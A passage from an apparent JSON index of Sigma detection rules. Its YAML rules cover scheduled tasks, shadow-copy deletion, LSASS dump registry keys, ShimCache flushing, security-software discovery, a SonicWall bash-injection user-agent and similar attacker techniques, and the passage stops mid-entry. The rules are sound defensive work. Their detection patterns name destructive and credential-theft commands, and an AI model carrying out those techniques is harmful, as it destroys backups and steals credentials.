","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_scheduled_task_deletion.yml/","tags":["attack.execution","attack.privilege_escalation","car.2013-08-001","attack.t1053.005"],"title":"Scheduled Task Deletion"},{"categories":null,"contents":"Detects specific process parameters as used by ACTINIUM scheduled task persistence creation.\nKnown false-positives Unlikely References https://www.microsoft.com/security/blog/2022/02/04/actinium-targets-ukrainian-organizations Raw rule (edit) title: Scheduled Task WScript VBScript id: e1118a8f-82f5-44b3-bb6b-8a284e5df602 status: experimental description: Detects specific process parameters as used by ACTINIUM scheduled task persistence creation. author: Andreas Hunkeler (@Karneades) references: - https://www.microsoft.com/security/blog/2022/02/04/actinium-targets-ukrainian-organizations date: 2022/02/07 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;schtasks\u0026#39; - \u0026#39;create\u0026#39; - \u0026#39;wscript\u0026#39; - \u0026#39;e:vbscript\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_actinium_persistence.yml/","tags":null,"title":"Scheduled Task WScript VBScript"},{"categories":null,"contents":"Detects the use of at/atd\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.001/T1053.001.md Raw rule (edit) title: Scheduled Task/Job At id: d2d642d7-b393-43fe-bae4-e81ed5915c4b status: stable description: Detects the use of at/atd author: Ömer Günal, oscd.community date: 2020/10/06 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.001/T1053.001.md logsource: product: linux category: process_creation detection: selection: Image|endswith: - \u0026#39;/at\u0026#39; - \u0026#39;/atd\u0026#39; condition: selection falsepositives: - Legitimate administration activities level: low tags: - attack.persistence - attack.t1053.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_at_command.yml/","tags":["attack.persistence","attack.t1053.001"],"title":"Scheduled Task/Job At"},{"categories":null,"contents":"Detects attempts to use screencapture to collect macOS screenshots\nKnown false-positives Legitimate user activity taking screenshots References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.md https://github.com/BC-SECURITY/Empire/blob/master/lib/modules/python/collection/osx/screenshot.py Raw rule (edit) title: Screen Capture - macOS id: 0877ed01-da46-4c49-8476-d49cdd80dfa7 status: test description: Detects attempts to use screencapture to collect macOS screenshots author: remotephone, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.md - https://github.com/BC-SECURITY/Empire/blob/master/lib/modules/python/collection/osx/screenshot.py date: 2020/10/13 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection: Image: \u0026#39;/usr/sbin/screencapture\u0026#39; condition: selection falsepositives: - Legitimate user activity taking screenshots level: low tags: - attack.collection - attack.t1113 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_screencapture.yml/","tags":["attack.collection","attack.t1113"],"title":"Screen Capture - macOS"},{"categories":null,"contents":"Detects ScreenConnect program starts that establish a remote access to that system (not meeting, not remote support)\nKnown false-positives Legitimate use by administrative staff References https://www.anomali.com/blog/probable-iranian-cyber-actors-static-kitten-conducting-cyberespionage-campaign-targeting-uae-and-kuwait-government-agencies Raw rule (edit) title: ScreenConnect Remote Access id: 75bfe6e6-cd8e-429e-91d3-03921e1d7962 status: experimental description: Detects ScreenConnect program starts that establish a remote access to that system (not meeting, not remote support) references: - https://www.anomali.com/blog/probable-iranian-cyber-actors-static-kitten-conducting-cyberespionage-campaign-targeting-uae-and-kuwait-government-agencies author: Florian Roth date: 2021/02/11 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;e=Access\u0026amp;\u0026#39; - \u0026#39;y=Guest\u0026amp;\u0026#39; - \u0026#39;\u0026amp;p=\u0026#39; - \u0026#39;\u0026amp;c=\u0026#39; - \u0026#39;\u0026amp;k=\u0026#39; condition: selection falsepositives: - Legitimate use by administrative staff level: high tags: - attack.initial_access - attack.t1133 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_screenconnect_access.yml/","tags":["attack.initial_access","attack.t1133"],"title":"ScreenConnect Remote Access"},{"categories":null,"contents":"Detects a suspicious child process of Script Event Consumer (scrcons.exe).\nKnown false-positives unknown References https://redcanary.com/blog/child-processes/ https://docs.paloaltonetworks.com/cortex/cortex-xdr/cortex-xdr-analytics-alert-reference/cortex-xdr-analytics-alert-reference/scrcons-exe-rare-child-process.html Raw rule (edit) title: Script Event Consumer Spawning Process id: f6d1dd2f-b8ce-40ca-bc23-062efb686b34 status: experimental description: Detects a suspicious child process of Script Event Consumer (scrcons.exe). references: - https://redcanary.com/blog/child-processes/ - https://docs.paloaltonetworks.com/cortex/cortex-xdr/cortex-xdr-analytics-alert-reference/cortex-xdr-analytics-alert-reference/scrcons-exe-rare-child-process.html author: Sittikorn S date: 2021/06/21 tags: - attack.execution - attack.t1047 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - \u0026#39;\\scrcons.exe\u0026#39; Image|endswith: - \u0026#39;\\svchost.exe\u0026#39; - \u0026#39;\\dllhost.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; - \u0026#39;\\schtasks.exe\u0026#39; - \u0026#39;\\regsvr32.exe\u0026#39; - \u0026#39;\\mshta.exe\u0026#39; - \u0026#39;\\rundll32.exe\u0026#39; - \u0026#39;\\msiexec.exe\u0026#39; - \u0026#39;\\msbuild.exe\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_script_event_consumer_spawn.yml/","tags":["attack.execution","attack.t1047"],"title":"Script Event Consumer Spawning Process"},{"categories":null,"contents":"Detects a suspicious script executions in temporary folders or folders accessible by environment variables\nKnown false-positives Unknown References https://www.virustotal.com/gui/file/91ba814a86ddedc7a9d546e26f912c541205b47a853d227756ab1334ade92c3f Raw rule (edit) title: Script Interpreter Execution From Suspicious Folder id: 1228c958-e64e-4e71-92ad-7d429f4138ba description: Detects a suspicious script executions in temporary folders or folders accessible by environment variables status: experimental references: - https://www.virustotal.com/gui/file/91ba814a86ddedc7a9d546e26f912c541205b47a853d227756ab1334ade92c3f author: Florian Roth date: 2022/02/08 tags: - attack.execution - attack.t1059 logsource: category: process_creation product: windows detection: selection_image: Image|endswith: - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\mshta.exe\u0026#39; - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; - \u0026#39;\\cmd.exe\u0026#39; selection_flags: CommandLine|contains: - \u0026#39; -w hidden \u0026#39; - \u0026#39; -ep bypass \u0026#39; - \u0026#39;/e:vbscript \u0026#39; - \u0026#39;/e:javascript \u0026#39; selection_original: OriginalFileName: - \u0026#39;powershell.exe\u0026#39; - \u0026#39;mshta.exe\u0026#39; - \u0026#39;wscript.exe\u0026#39; - \u0026#39;cscript.exe\u0026#39; - \u0026#39;cmd.exe\u0026#39; folders: Image|contains: - \u0026#39;\\Windows\\Temp\u0026#39; - \u0026#39;\\Temporary Internet\u0026#39; - \u0026#39;\\AppData\\Local\\Temp\u0026#39; - \u0026#39;\\AppData\\Roaming\\Temp\u0026#39; - \u0026#39;C:\\Users\\Public\\\u0026#39; - \u0026#39;C:\\Perflogs\\\u0026#39; condition: 1 of selection* and folders falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_script_exec_from_env_folder.yml/","tags":["attack.execution","attack.t1059"],"title":"Script Interpreter Execution From Suspicious Folder"},{"categories":null,"contents":"A General detection for sdclt spawning new processes. This could be an indicator of sdclt being used for bypass UAC techniques.\nKnown false-positives unknown References https://github.com/OTRF/detection-hackathon-apt29/issues/6 https://threathunterplaybook.com/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.html Raw rule (edit) title: Sdclt Child Processes id: da2738f2-fadb-4394-afa7-0a0674885afa status: test description: A General detection for sdclt spawning new processes. This could be an indicator of sdclt being used for bypass UAC techniques. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://github.com/OTRF/detection-hackathon-apt29/issues/6 - https://threathunterplaybook.com/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.html date: 2020/05/02 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\sdclt.exe\u0026#39; condition: selection falsepositives: - unknown level: medium tags: - attack.privilege_escalation - attack.t1548.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_sdclt_child_process.yml/","tags":["attack.privilege_escalation","attack.t1548.002"],"title":"Sdclt Child Processes"},{"categories":null,"contents":"Detects usage of system utilities (only grep for now) to discover security software discovery\nKnown false-positives Legitimate activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md Raw rule (edit) title: Security Software Discovery id: 0ed75b9c-c73b-424d-9e7d-496cd565fbe0 status: test description: Detects usage of system utilities (only grep for now) to discover security software discovery author: Daniil Yugoslavskiy, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: macos detection: grep_execution: Image: \u0026#39;/usr/bin/grep\u0026#39; security_services_and_processes: CommandLine|contains: - \u0026#39;nessusd\u0026#39; # nessus vulnerability scanner - \u0026#39;santad\u0026#39; # google santa - \u0026#39;CbDefense\u0026#39; # carbon black - \u0026#39;falcond\u0026#39; # crowdstrike falcon - \u0026#39;td-agent\u0026#39; # fluentd log shipper - \u0026#39;packetbeat\u0026#39; # elastic network logger/shipper - \u0026#39;filebeat\u0026#39; # elastic log file shipper - \u0026#39;auditbeat\u0026#39; # elastic auditing agent/log shipper - \u0026#39;osqueryd\u0026#39; # facebook osquery - \u0026#39;BlockBlock\u0026#39; # Objective-See persistence locations watcher/blocker - \u0026#39;LuLu\u0026#39; # Objective-See firewall management utility little_snitch_process: # Objective Development Software firewall management utility CommandLine|contains|all: - \u0026#39;Little\u0026#39; - \u0026#39;Snitch\u0026#39; condition: grep_execution and security_services_and_processes or grep_execution and little_snitch_process falsepositives: - Legitimate activities level: medium tags: - attack.discovery - attack.t1518.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_security_software_discovery.yml/","tags":["attack.discovery","attack.t1518.001"],"title":"Security Software Discovery"},{"categories":null,"contents":"Detects usage of system utilities (only grep for now) to discover security software discovery\nKnown false-positives Legitimate activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md Raw rule (edit) title: Security Software Discovery id: c9d8b7fd-78e4-44fe-88f6-599135d46d60 status: test description: Detects usage of system utilities (only grep for now) to discover security software discovery author: Daniil Yugoslavskiy, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: linux detection: grep_execution: Image|endswith: \u0026#39;/grep\u0026#39; security_services_and_processes: CommandLine|contains: - \u0026#39;nessusd\u0026#39; # nessus vulnerability scanner - \u0026#39;td-agent\u0026#39; # fluentd log shipper - \u0026#39;packetbeat\u0026#39; # elastic network logger/shipper - \u0026#39;filebeat\u0026#39; # elastic log file shipper - \u0026#39;auditbeat\u0026#39; # elastic auditing agent/log shipper - \u0026#39;osqueryd\u0026#39; # facebook osquery - \u0026#39;cbagentd\u0026#39; # carbon black - \u0026#39;falcond\u0026#39; # crowdstrike falcon condition: grep_execution and security_services_and_processes falsepositives: - Legitimate activities level: low tags: - attack.discovery - attack.t1518.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_security_software_discovery.yml/","tags":["attack.discovery","attack.t1518.001"],"title":"Security Software Discovery"},{"categories":null,"contents":"Detects the modification of a ServiceDLL value in the service settings\nKnown false-positives Administrative scripts Installation of a service References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md#atomic-test-4---tinyturla-backdoor-service-w64time Raw rule (edit) title: ServiceDll Modification id: 612e47e9-8a59-43a6-b404-f48683f45bd6 description: Detects the modification of a ServiceDLL value in the service settings author: frack113 date: 2022/02/04 status: experimental references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md#atomic-test-4---tinyturla-backdoor-service-w64time logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|startswith: \u0026#39;HKLM\\System\\CurrentControlSet\\Services\\\u0026#39; TargetObject|endswith: \u0026#39;\\Parameters\\ServiceDll\u0026#39; condition: selection falsepositives: - Administrative scripts - Installation of a service level: medium tags: - attack.persistence - attack.privilege_escalation - attack.t1543.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_set_servicedll.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1543.003"],"title":"ServiceDll Modification"},{"categories":null,"contents":"Marks a file as a system file using the attrib.exe utility\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.001/T1564.001.md#atomic-test-3---create-windows-system-file-with-attrib https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/attrib Raw rule (edit) title: Set Windows System File with Attrib id: bb19e94c-59ae-4c15-8c12-c563d23fe52b status: experimental description: Marks a file as a system file using the attrib.exe utility author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.001/T1564.001.md#atomic-test-3---create-windows-system-file-with-attrib - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/attrib date: 2022/02/04 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\attrib.exe CommandLine|contains: \u0026#39; +s \u0026#39; condition: selection falsepositives: - Unknown level: low tags: - attack.defense_evasion - attack.t1564.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_attrib_system.yml/","tags":["attack.defense_evasion","attack.t1564.001"],"title":"Set Windows System File with Attrib"},{"categories":null,"contents":"Shadow Copies storage symbolic link creation using operating systems utilities\nKnown false-positives Legitimate administrator working with shadow copies, access for backup purposes References https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment Raw rule (edit) title: Shadow Copies Access via Symlink id: 40b19fa6-d835-400c-b301-41f3a2baacaf status: test description: Shadow Copies storage symbolic link creation using operating systems utilities author: Teymur Kheirkhabarov, oscd.community references: - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment date: 2019/10/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - mklink - HarddiskVolumeShadowCopy condition: selection falsepositives: - Legitimate administrator working with shadow copies, access for backup purposes level: medium tags: - attack.credential_access - attack.t1003.002 - attack.t1003.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_shadow_copies_access_symlink.yml/","tags":["attack.credential_access","attack.t1003.002","attack.t1003.003"],"title":"Shadow Copies Access via Symlink"},{"categories":null,"contents":"Shadow Copies creation using operating systems utilities, possible credential access\nKnown false-positives Legitimate administrator working with shadow copies, access for backup purposes References https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system/ Raw rule (edit) title: Shadow Copies Creation Using Operating Systems Utilities id: b17ea6f7-6e90-447e-a799-e6c0a493d6ce status: test description: Shadow Copies creation using operating systems utilities, possible credential access author: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community references: - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system/ date: 2019/10/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\wmic.exe\u0026#39; - \u0026#39;\\vssadmin.exe\u0026#39; CommandLine|contains|all: - shadow - create condition: selection falsepositives: - Legitimate administrator working with shadow copies, access for backup purposes level: medium tags: - attack.credential_access - attack.t1003 - attack.t1003.002 - attack.t1003.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_shadow_copies_creation.yml/","tags":["attack.credential_access","attack.t1003","attack.t1003.002","attack.t1003.003"],"title":"Shadow Copies Creation Using Operating Systems Utilities"},{"categories":null,"contents":"Shadow Copies deletion using operating systems utilities\nKnown false-positives Legitimate Administrator deletes Shadow Copies using operating systems utilities for legitimate reason LANDesk LDClient Ivanti-PSModule (PS EncodedCommand) References https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment https://blog.talosintelligence.com/2017/05/wannacry.html https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/new-teslacrypt-ransomware-arrives-via-spam/ https://www.bleepingcomputer.com/news/security/why-everyone-should-disable-vssadmin-exe-now/ https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100 https://github.com/Neo23x0/Raccine#the-process https://github.com/Neo23x0/Raccine/blob/main/yara/gen_ransomware_command_lines.yar https://redcanary.com/blog/intelligence-insights-october-2021/ Raw rule (edit) title: Shadow Copies Deletion Using Operating Systems Utilities id: c947b146-0abc-4c87-9c64-b17e9d7274a2 status: stable description: Shadow Copies deletion using operating systems utilities author: Florian Roth, Michael Haag, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community, Andreas Hunkeler (@Karneades) date: 2019/10/22 modified: 2021/10/24 references: - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment - https://blog.talosintelligence.com/2017/05/wannacry.html - https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/new-teslacrypt-ransomware-arrives-via-spam/ - https://www.bleepingcomputer.com/news/security/why-everyone-should-disable-vssadmin-exe-now/ - https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100 - https://github.com/Neo23x0/Raccine#the-process - https://github.com/Neo23x0/Raccine/blob/main/yara/gen_ransomware_command_lines.yar - https://redcanary.com/blog/intelligence-insights-october-2021/ tags: - attack.defense_evasion - attack.impact - attack.t1070 - attack.t1490 logsource: category: process_creation product: windows detection: selection1: Image|endswith: - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\wmic.exe\u0026#39; - \u0026#39;\\vssadmin.exe\u0026#39; - \u0026#39;\\diskshadow.exe\u0026#39; CommandLine|contains|all: - shadow # will match \u0026#34;delete shadows\u0026#34; and \u0026#34;shadowcopy delete\u0026#34; and \u0026#34;shadowstorage\u0026#34; - delete selection2: Image|endswith: - \u0026#39;\\wbadmin.exe\u0026#39; CommandLine|contains|all: - delete - catalog - quiet # will match -quiet or /quiet selection3: Image|endswith: \u0026#39;\\vssadmin.exe\u0026#39; CommandLine|contains|all: - resize - shadowstorage - unbounded condition: 1 of selection* fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate Administrator deletes Shadow Copies using operating systems utilities for legitimate reason - LANDesk LDClient Ivanti-PSModule (PS EncodedCommand) level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_shadow_copies_deletion.yml/","tags":["attack.defense_evasion","attack.impact","attack.t1070","attack.t1490"],"title":"Shadow Copies Deletion Using Operating Systems Utilities"},{"categories":null,"contents":"Detects actions that clear the local ShimCache and remove forensic evidence\nKnown false-positives Unknown References https://medium.com/@blueteamops/shimcache-flush-89daff28d15e Raw rule (edit) title: ShimCache Flush id: b0524451-19af-4efa-a46f-562a977f792e status: experimental description: Detects actions that clear the local ShimCache and remove forensic evidence references: - https://medium.com/@blueteamops/shimcache-flush-89daff28d15e tags: - attack.defense_evasion - attack.t1112 author: Florian Roth date: 2021/02/01 logsource: category: process_creation product: windows detection: selection1a: CommandLine|contains|all: - \u0026#39;rundll32\u0026#39; - \u0026#39;apphelp.dll\u0026#39; selection1b: CommandLine|contains: - \u0026#39;ShimFlushCache\u0026#39; - \u0026#39;#250\u0026#39; selection2a: CommandLine|contains|all: - \u0026#39;rundll32\u0026#39; - \u0026#39;kernel32.dll\u0026#39; selection2b: CommandLine|contains: - \u0026#39;BaseFlushAppcompatCache\u0026#39; - \u0026#39;#46\u0026#39; condition: ( selection1a and selection1b ) or ( selection2a and selection2b ) fields: - Image - CommandLine - ParentCommandLine falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_shimcache_flush.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"ShimCache Flush"},{"categories":null,"contents":"Detects changes to the Registry in which a monitor program gets registered to monitor the exit of another process\nKnown false-positives Unknown References https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/ https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/ Raw rule (edit) title: SilentProcessExit Monitor Registrytion id: c81fe886-cac0-4913-a511-2822d72ff505 description: Detects changes to the Registry in which a monitor program gets registered to monitor the exit of another process status: experimental author: Florian Roth references: - https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/ - https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/ date: 2021/02/26 modified: 2022/01/13 tags: - attack.persistence - attack.t1546.012 logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|contains: \u0026#39;Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\u0026#39; Details|contains: \u0026#39;MonitorProcess\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_silentprocessexit.yml/","tags":["attack.persistence","attack.t1546.012"],"title":"SilentProcessExit Monitor Registrytion"},{"categories":null,"contents":"Detects changes to the Registry in which a monitor program gets registered to dump process memory of the lsass.exe process memory\nKnown false-positives Unknown References https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/ https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/ Raw rule (edit) title: SilentProcessExit Monitor Registrytion for LSASS id: 55e29995-75e7-451a-bef0-6225e2f13597 description: Detects changes to the Registry in which a monitor program gets registered to dump process memory of the lsass.exe process memory status: experimental author: Florian Roth references: - https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/ - https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/ date: 2021/02/26 tags: - attack.credential_access - attack.t1003.007 logsource: category: registry_event product: windows detection: selection: TargetObject|contains: \u0026#39;Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe\u0026#39; condition: selection falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_silentprocessexit_lsass.yml/","tags":["attack.credential_access","attack.t1003.007"],"title":"SilentProcessExit Monitor Registrytion for LSASS"},{"categories":null,"contents":"Detects a possible remote connections to Silenttrinity c2\nKnown false-positives unknown References https://www.blackhillsinfosec.com/my-first-joyride-with-silenttrinity/ Raw rule (edit) title: Silenttrinity Stager Msbuild Activity id: 50e54b8d-ad73-43f8-96a1-5191685b17a4 status: test description: Detects a possible remote connections to Silenttrinity c2 author: Kiran kumar s, oscd.community references: - https://www.blackhillsinfosec.com/my-first-joyride-with-silenttrinity/ date: 2020/10/11 modified: 2021/11/27 logsource: category: network_connection product: windows detection: selection: Image|endswith: \u0026#39;\\msbuild.exe\u0026#39; filter: DestinationPort: - \u0026#39;80\u0026#39; - \u0026#39;443\u0026#39; Initiated: \u0026#39;true\u0026#39; condition: selection and filter falsepositives: - unknown level: high tags: - attack.execution - attack.t1127.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_silenttrinity_stager_msbuild_activity.yml/","tags":["attack.execution","attack.t1127.001"],"title":"Silenttrinity Stager Msbuild Activity"},{"categories":null,"contents":"Look for non-system accounts SMB accessing a file with write (0x2) access mask via administrative share (i.e C$).\nKnown false-positives Unknown References https://github.com/OTRF/ThreatHunter-Playbook/blob/master/playbooks/WIN-201012004336.yaml https://securitydatasets.com/notebooks/small/windows/08_lateral_movement/SDWIN-200806015757.html?highlight=create%20file Raw rule (edit) title: SMB Create Remote File Admin Share id: b210394c-ba12-4f89-9117-44a2464b9511 status: test description: Look for non-system accounts SMB accessing a file with write (0x2) access mask via administrative share (i.e C$). author: Jose Rodriguez (@Cyb3rPandaH), OTR (Open Threat Research) references: - https://github.com/OTRF/ThreatHunter-Playbook/blob/master/playbooks/WIN-201012004336.yaml - https://securitydatasets.com/notebooks/small/windows/08_lateral_movement/SDWIN-200806015757.html?highlight=create%20file date: 2020/08/06 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 5145 ShareName|endswith: \u0026#39;C$\u0026#39; AccessMask: \u0026#39;0x2\u0026#39; filter: SubjectUserName|endswith: \u0026#39;$\u0026#39; condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.lateral_movement - attack.t1021.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_smb_file_creation_admin_shares.yml/","tags":["attack.lateral_movement","attack.t1021.002"],"title":"SMB Create Remote File Admin Share"},{"categories":null,"contents":"Detects the use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled.\nKnown false-positives Domain Controllers that are sometimes, commonly although should not be, acting as printer servers too References https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1 https://dirkjanm.io/a-different-way-of-abusing-zerologon/ https://twitter.com/_dirkjan/status/1309214379003588608 Raw rule (edit) title: SMB Spoolss Name Piped Usage id: bae2865c-5565-470d-b505-9496c87d0c30 description: Detects the use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled. status: experimental author: OTR (Open Threat Research), @neu5ron references: - https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1 - https://dirkjanm.io/a-different-way-of-abusing-zerologon/ - https://twitter.com/_dirkjan/status/1309214379003588608 tags: - attack.lateral_movement - attack.t1021.002 date: 2018/11/28 modified: 2021/08/23 logsource: product: zeek service: smb_files detection: selection: path|endswith: IPC$ name: spoolss condition: selection falsepositives: - Domain Controllers that are sometimes, commonly although should not be, acting as printer servers too level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_dce_rpc_smb_spoolss_named_pipe.yml/","tags":["attack.lateral_movement","attack.t1021.002"],"title":"SMB Spoolss Name Piped Usage"},{"categories":null,"contents":"Detects exploitation attempts of the SonicWall Jarrewrite Exploit\nKnown false-positives Unknown References https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/ Raw rule (edit) title: SonicWall SSL/VPN Jarrewrite Exploit id: 6f55f047-112b-4101-ad32-43913f52db46 status: experimental description: Detects exploitation attempts of the SonicWall Jarrewrite Exploit author: Florian Roth date: 2021/01/25 tags: - attack.t1190 - attack.initial_access references: - https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/ logsource: category: webserver detection: selection: c-uri|contains: \u0026#39;/cgi-bin/jarrewrite.sh\u0026#39; c-useragent|contains: - \u0026#39;:;\u0026#39; - \u0026#39;() {\u0026#39; - \u0026#39;/bin/bash -c\u0026#39; condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_sonicwall_jarrewrite_exploit.yml/","tags":["attack.t1190","attack.initial_access"],"title":"SonicWall SSL/VPN Jarrewrite Exploit"},{"categories":null,"contents":"Detects source code enumeration that use GET requests by keyword searches in URL strings\nKnown false-positives unknown References https://pentester.land/tutorials/2018/10/25/source-code-disclosure-via-exposed-git-folder.html https://medium.com/@logicbomb_1/bugbounty-how-i-was-able-to-download-the-source-code-of-indias-largest-telecom-service-52cf5c5640a1 Raw rule (edit) title: Source Code Enumeration Detection by Keyword id: 953d460b-f810-420a-97a2-cfca4c98e602 status: test description: Detects source code enumeration that use GET requests by keyword searches in URL strings author: James Ahearn references: - https://pentester.land/tutorials/2018/10/25/source-code-disclosure-via-exposed-git-folder.html - https://medium.com/@logicbomb_1/bugbounty-how-i-was-able-to-download-the-source-code-of-indias-largest-telecom-service-52cf5c5640a1 date: 2019/06/08 modified: 2021/11/27 logsource: category: webserver detection: keywords: - \u0026#39;*.git/*\u0026#39; condition: keywords fields: - client_ip - vhost - url - response falsepositives: - unknown level: medium tags: - attack.discovery - attack.t1083 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_source_code_enumeration.yml/","tags":["attack.discovery","attack.t1083"],"title":"Source Code Enumeration Detection by Keyword"},{"categories":null,"contents":"Detection use of the command \u0026ldquo;split\u0026rdquo; to split files into parts and possible transfer.\nKnown false-positives Legitimate administrative activity References 